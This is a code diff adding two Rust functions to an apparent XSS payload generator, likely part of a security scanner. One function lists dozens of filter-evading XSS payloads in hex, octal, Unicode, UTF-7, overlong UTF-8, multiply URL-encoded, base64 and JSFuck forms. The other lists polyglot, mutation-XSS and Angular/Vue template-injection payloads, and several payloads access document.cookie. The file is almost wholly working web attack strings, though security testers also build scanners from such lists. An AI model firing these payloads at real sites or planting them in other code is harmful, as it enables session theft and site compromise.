@@ -1024,6 +1024,288 @@ pub fn generate_modern_waf_bypass_xss() -> Vec<String> {
     payloads
 }
 
+/// Generate advanced encoding bypass XSS payloads (50+)
+/// Covers hex, octal, Unicode, UTF-7, overlong UTF-8, and mixed encodings for WAF bypass
+pub fn generate_advanced_encoding_bypass_xss() -> Vec<String> {
+    let mut payloads = Vec::new();
+
+    // ===========================================
+    // 1. HEX ENCODING (\xNN format in JavaScript)
+    // ===========================================
+
+    // \x61\x6c\x65\x72\x74 = "alert"
+    payloads.extend(vec![
+        // Basic hex-encoded alert
+        r#"<script>\x61\x6c\x65\x72\x74(1)</script>"#.to_string(),
+        r#"<script>\x61\x6c\x65\x72\x74(document.domain)</script>"#.to_string(),
+        r#"<script>\x61\x6c\x65\x72\x74(document.cookie)</script>"#.to_string(),
+
+        // Hex in event handlers
+        r#"<img src=x onerror=\x61\x6c\x65\x72\x74(1)>"#.to_string(),
+        r#"<svg onload=\x61\x6c\x65\x72\x74(1)>"#.to_string(),
+        r#"<body onload=\x61\x6c\x65\x72\x74(1)>"#.to_string(),
+
+        // Hex-encoded tags and attributes
+        r#"<\x73\x63\x72\x69\x70\x74>alert(1)</script>"#.to_string(), // <script>
+        r#"<script>\x65\x76\x61\x6c('alert(1)')</script>"#.to_string(), // eval
+        r#"<script>\x46\x75\x6e\x63\x74\x69\x6f\x6e('alert(1)')()</script>"#.to_string(), // Function
+
+        // Partial hex encoding (mixed)
+        r#"<script>al\x65rt(1)</script>"#.to_string(),
+        r#"<script>\x61lert(1)</script>"#.to_string(),
+        r#"<img src=x on\x65rror=alert(1)>"#.to_string(),
+    ]);
+
+    // ===========================================
+    // 2. OCTAL ENCODING (\NNN format)
+    // ===========================================
+
+    // \141\154\145\162\164 = "alert"
+    payloads.extend(vec![
+        // Basic octal-encoded alert
+        r#"<script>\141\154\145\162\164(1)</script>"#.to_string(),
+        r#"<script>\141\154\145\162\164(document.domain)</script>"#.to_string(),
+
+        // Octal in event handlers
+        r#"<img src=x onerror=\141\154\145\162\164(1)>"#.to_string(),
+        r#"<svg onload=\141\154\145\162\164(1)>"#.to_string(),
+
+        // javascript: protocol in octal
+        // \152\141\166\141\163\143\162\151\160\164 = "javascript"
+        r#"<a href="\152\141\166\141\163\143\162\151\160\164:alert(1)">click</a>"#.to_string(),
+
+        // Partial SVG tag in octal: \74\163\166\147 = "<svg"
+        r#"javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'"#.to_string(),
+
+        // Mixed octal
+        r#"<script>al\145rt(1)</script>"#.to_string(),
+        r#"<script>\141lert(1)</script>"#.to_string(),
+    ]);
+
+    // ===========================================
+    // 3. UNICODE ESCAPES (\uNNNN format)
+    // ===========================================
+
+    // \u0061\u006c\u0065\u0072\u0074 = "alert"
+    payloads.extend(vec![
+        // Basic Unicode-encoded alert
+        r#"<script>\u0061\u006c\u0065\u0072\u0074(1)</script>"#.to_string(),
+        r#"<script>\u0061\u006c\u0065\u0072\u0074(document.domain)</script>"#.to_string(),
+        r#"<script>\u0061\u006c\u0065\u0072\u0074(document.cookie)</script>"#.to_string(),
+
+        // Unicode in event handlers
+        r#"<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>"#.to_string(),
+        r#"<svg onload=\u0061\u006c\u0065\u0072\u0074(1)>"#.to_string(),
+        r#"<body onload=\u0061\u006c\u0065\u0072\u0074(1)>"#.to_string(),
+
+        // Full-width Unicode bypass characters
+        // U+FF1C = < (full-width less-than)
+        // U+FF1E = > (full-width greater-than)
+        "<\u{FF1C}script\u{FF1E}alert(1)</script>".to_string(),
+        "<img src=x onerror=\u{FF1C}alert(1)\u{FF1E}>".to_string(),
+
+        // Unicode eval
+        r#"<script>\u0065\u0076\u0061\u006c('alert(1)')</script>"#.to_string(),
+
+        // Unicode Function constructor
+        r#"<script>\u0046\u0075\u006e\u0063\u0074\u0069\u006f\u006e('alert(1)')()</script>"#.to_string(),
+
+        // Partial Unicode encoding
+        r#"<script>al\u0065rt(1)</script>"#.to_string(),
+        r#"<script>\u0061lert(1)</script>"#.to_string(),
+    ]);
+
+    // ===========================================
+    // 4. UTF-7 ENCODING (+ADw- format for legacy charset attacks)
+    // ===========================================
+
+    // +ADw- = < | +AD4- = > | +ACI- = "
+    payloads.extend(vec![
+        // Basic UTF-7 script tag
+        "+ADw-script+AD4-alert(1)+ADw-/script+AD4-".to_string(),
+        "+ADw-script+AD4-alert(document.domain)+ADw-/script+AD4-".to_string(),
+        "+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-".to_string(),
+
+        // UTF-7 img tag with event handler
+        "+ADw-img src+AD0-+ACI-1+ACI- onerror+AD0-+ACI-alert(1)+ACI- /+AD4-".to_string(),
+        "+ADw-img src+AD0-x onerror+AD0-alert(1)+AD4-".to_string(),
+
+        // UTF-7 SVG
+        "+ADw-svg onload+AD0-alert(1)+AD4-".to_string(),
+        "+ADw-svg/onload+AD0-alert(1)+AD4-".to_string(),
+
+        // UTF-7 body tag
+        "+ADw-body onload+AD0-alert(1)+AD4-".to_string(),
+
+        // UTF-7 with charset header injection
+        "+ADw-meta http-equiv+AD0-+ACI-Content-Type+ACI- content+AD0-+ACI-text/html+ADs- charset+AD0-UTF-7+ACI-+AD4-+ADw-script+AD4-alert(1)+ADw-/script+AD4-".to_string(),
+    ]);
+
+    // ===========================================
+    // 5. UTF-8 OVERLONG SEQUENCES (WAF bypass)
+    // ===========================================
+
+    // These exploit UTF-8 encoding allowing multiple representations
+    // < (U+003C) can be encoded as:
+    // - 2-byte overlong: C0 BC
+    // - 3-byte overlong: E0 80 BC
+    // - 4-byte overlong: F0 80 80 BC
+    payloads.extend(vec![
+        // 2-byte overlong < (%C0%BC)
+        "<%C0%BCscript>alert(1)</script>".to_string(),
+        "<%C0%BCimg src=x onerror=alert(1)>".to_string(),
+        "<%C0%BCsvg onload=alert(1)>".to_string(),
+
+        // 3-byte overlong < (%E0%80%BC)
+        "<%E0%80%BCscript>alert(1)</script>".to_string(),
+        "<%E0%80%BCimg src=x onerror=alert(1)>".to_string(),
+        "<%E0%80%BCsvg onload=alert(1)>".to_string(),
+
+        // 4-byte overlong < (%F0%80%80%BC)
+        "<%F0%80%80%BCscript>alert(1)</script>".to_string(),
+        "<%F0%80%80%BCimg src=x onerror=alert(1)>".to_string(),
+
+        // Mixed overlong sequences
+        "<%C0%BCscript%C0%BEalert(1)<%C0%BC/script%C0%BE".to_string(),
+        "<%E0%80%BCscript%E0%80%BEalert(1)<%E0%80%BC/script%E0%80%BE".to_string(),
+    ]);
+
+    // ===========================================
+    // 6. MIXED/NESTED ENCODINGS
+    // ===========================================
+
+    payloads.extend(vec![
+        // String.fromCharCode (97,108,101,114,116 = "alert")
+        "eval(String.fromCharCode(97,108,101,114,116,40,49,41))".to_string(),
+        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>".to_string(),
+        "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>".to_string(),
+
+        // Double URL encoding
+        "%253Cscript%253Ealert(1)%253C/script%253E".to_string(),
+        "%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E".to_string(),
+        "%253Csvg%2520onload%253Dalert(1)%253E".to_string(),
+
+        // Triple URL encoding
+        "%25253Cscript%25253Ealert(1)%25253C/script%25253E".to_string(),
+
+        // Mixed hex + HTML entity
+        r#"<script>\x61lert&#40;1&#41;</script>"#.to_string(),
+
+        // Mixed Unicode + HTML entity
+        r#"<script>\u0061lert&#40;1&#41;</script>"#.to_string(),
+
+        // Base64 in data URI
+        "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">click</a>".to_string(),
+        "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">".to_string(),
+
+        // atob (base64 decode in JS)
+        "<script>eval(atob('YWxlcnQoMSk='))</script>".to_string(),
+        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>".to_string(),
+
+        // decodeURIComponent
+        "<script>eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))</script>".to_string(),
+
+        // Combined String.fromCharCode with hex
+        r#"<script>eval(String['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'](97,108,101,114,116,40,49,41))</script>"#.to_string(),
+
+        // Unicode escapes in property access
+        r#"<script>window['\u0061\u006c\u0065\u0072\u0074'](1)</script>"#.to_string(),
+        r#"<script>this['\u0061\u006c\u0065\u0072\u0074'](1)</script>"#.to_string(),
+        r#"<script>self['\u0061\u006c\u0065\u0072\u0074'](1)</script>"#.to_string(),
+
+        // Hex escapes in property access
+        r#"<script>window['\x61\x6c\x65\x72\x74'](1)</script>"#.to_string(),
+        r#"<script>this['\x61\x6c\x65\x72\x74'](1)</script>"#.to_string(),
+
+        // JSFuck-style encoding (partial)
+        "<script>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]</script>".to_string(),
+    ]);
+
+    payloads
+}
+
+/// Generate advanced polyglot XSS payloads (15+)
+/// Polyglots work across multiple contexts: HTML body, attribute, JS string, URL, template literals
+pub fn generate_advanced_polyglot_xss() -> Vec<String> {
+    vec![
+        // ===========================================
+        // 1. 0xsobky Ultimate Polyglot (JS, HTML event, SVG, URL)
+        // Works in: script context, event handler, SVG, data URI
+        // ===========================================
+        r#"jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e"#.to_string(),
+
+        // ===========================================
+        // 2. Mathias Karlsson Polyglot (attribute/event/comment)
+        // Breaks out of: attributes, event handlers, HTML comments
+        // ===========================================
+        r#"'-alert(1)-'"#.to_string(),
+        r#"'-alert(1)//'"#.to_string(),
+        r#"-->'"/><img src=x onerror=alert(1)//>"#.to_string(),
+
+        // ===========================================
+        // 3. Multi-context string polyglot (single/double quote JS strings)
+        // Works in both single and double quoted strings
+        // ===========================================
+        r#"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"'>><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"#.to_string(),
+
+        // ===========================================
+        // 4. HTML/JS/URL polyglot
+        // Works in: HTML context, JS context, URL context
+        // ===========================================
+        r#"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"#.to_string(),
+        r#"javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//"#.to_string(),
+
+        // ===========================================
+        // 5. Comment breakout polyglot
+        // Breaks out of: HTML comments, JS comments, CSS comments
+        // ===========================================
+        r#"--!><svg/onload=alert()>"#.to_string(),
+        r#"*/alert(1)/*"#.to_string(),
+        r#"*/</script><script>alert(1)</script>/*"#.to_string(),
+        r#"--></script><script>alert(1)</script><!--"#.to_string(),
+
+        // ===========================================
+        // 6. Template literal polyglot (ES6)
+        // Works with backtick template strings
+        // ===========================================
+        r#"${alert(1)}"#.to_string(),
+        r#"`-alert(1)-`"#.to_string(),
+        r#"${`${alert(1)}`}"#.to_string(),
+        r#"</script><script>`${alert(1)}`</script>"#.to_string(),
+
+        // ===========================================
+        // 7. Mutation XSS polyglot
+        // Exploits browser HTML parsing quirks
+        // ===========================================
+        r#"<noscript><p title="</noscript><img src=x onerror=alert(1)>">"#.to_string(),
+        r#"<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>"#.to_string(),
+        r#"<svg><style>{font-family:'<img/src=x onerror=alert(1)>'}"#.to_string(),
+
+        // ===========================================
+        // 8. Universal context-breaker polyglot
+        // Breaks out of most common contexts
+        // ===========================================
+        r#"</title></style></textarea></noscript></template></script><img src=x onerror=alert(1)>"#.to_string(),
+        r#"'">--></style></script><script>alert(1)</script>"#.to_string(),
+
+        // ===========================================
+        // 9. Attribute value injection polyglot
+        // Works in: href, src, data, action attributes
+        // ===========================================
+        r#"javascript:alert(1)//http://example.com"#.to_string(),
+        r#"data:text/html,<script>alert(1)</script>"#.to_string(),
+
+        // ===========================================
+        // 10. Framework-specific polyglots
+        // Angular, React, Vue template injection
+        // ===========================================
+        r#"{{constructor.constructor('alert(1)')()}}"#.to_string(),  // Angular
+        r#"{{$on.constructor('alert(1)')()}}"#.to_string(),           // Angular
+        r#"[constructor.constructor('alert(1)')()]"#.to_string(),     // Vue
+        r#"<img src=x ng-on-error=alert(1)>"#.to_string(),           // AngularJS
+    ]
+}
+
 /// Get all XSS payloads (110,000+ total)
 pub fn get_all_xss_payloads() -> Vec<String> {
     let mut all_payloads = Vec::new();
